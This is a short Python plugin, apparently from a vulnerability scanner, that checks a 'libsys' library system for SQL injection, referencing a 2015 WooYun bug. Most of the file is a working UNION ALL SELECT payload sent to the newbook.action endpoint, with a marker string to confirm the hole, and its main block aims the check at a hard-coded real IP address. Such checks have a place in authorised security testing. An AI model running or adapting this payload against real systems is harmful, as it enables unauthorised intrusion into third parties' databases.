#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://www.wooyun.org/bugs/wooyun-2015-092533

import urllib

def assign(service, arg):
    if service == "libsys":
        return True, arg
        
def audit(arg):
    payload =  "/m/info/newbook.action?clsNo=A'%20UNION%20ALL%20SELECT%20CHR(113)||CHR(118)||CHR(113)||CHR(118)||CHR(113)||CHR(76)||CHR(90)||CHR(104)||CHR(66)||CHR(102)||CHR(71)||CHR(105)||CHR(73)||CHR(100)||CHR(100)||CHR(113)||CHR(122)||CHR(98)||CHR(106)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20DUAL--"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if 'qvqvqLZhBfGiIddqzbjq' in res:
        security_hole(arg + "/m/info/newbook.action?clsNo=A" + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://202.200.151.19:8081/')[1])